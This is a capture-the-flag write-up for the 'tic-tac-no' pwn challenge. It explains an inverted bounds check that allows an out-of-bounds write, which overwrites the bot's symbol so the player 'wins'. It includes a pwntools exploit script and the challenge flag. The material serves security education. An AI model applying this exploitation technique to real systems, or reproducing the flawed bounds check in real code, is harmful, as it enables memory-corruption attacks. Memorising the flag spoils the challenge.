# tic-tac-no

**Category:** pwn

---

#### Description

Tic-tac-toe is a draw when played perfectly. Can you be more perfect than my perfect bot?

`nc chall.lac.tf 30001`

#### Solution

The binary is a tic-tac-toe game against a minimax bot. The program prints the flag only if `winner == player` (player is `'X'`).

The vulnerability is in `playerMove()`. The bounds check logic is inverted:

```c
if(index >= 0 && index < 9 && board[index] != ' '){
   printf("Invalid move.\n");
}else{
   board[index] = player;
   break;
}
```

The `else` runs when *any* part of the `if` is false, including when `index` is out of bounds (`index < 0` or `index >= 9`). So we get an out-of-bounds write of `'X'` relative to the global `board`.

From `nm` (these are PIE-relative symbol offsets; the relative layout is stable even with ASLR):

* `player` @ `0x4050`
* `computer` @ `0x4051`
* `board` @ `0x4068`

So `board[-23]` targets `computer` because `0x4068 - 0x4051 = 0x17 = 23`. Choose inputs so: `index = (x-1)*3 + (y-1) = -23`, e.g. `x = -7`, `y = 2`.

This overwrites `computer` from `'O'` to `'X'`, making `computer == player == 'X'`. Now when the bot makes a 3-in-a-row of `'X'`, `checkWin()` returns `'X'` and the program treats it as a *player* win and prints the flag.

```python
from pwn import *

r = remote('chall.lac.tf', 30001)

# OOB write: index = (-7-1)*3 + (2-1) = -23
# board[-23] overwrites the 'computer' variable with 'X'
r.sendlineafter(b'row #(1-3): ', b'-7')
r.sendlineafter(b'column #(1-3): ', b'2')

# Play corner to help form a diagonal
r.sendlineafter(b'row #(1-3): ', b'1')
r.sendlineafter(b'column #(1-3): ', b'1')

# Computer completes the 0-4-8 diagonal with 'X' -> player "wins"
r.recvuntil(b'\n')
print(r.recvall(timeout=5).decode())
```

Flag: `lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}`
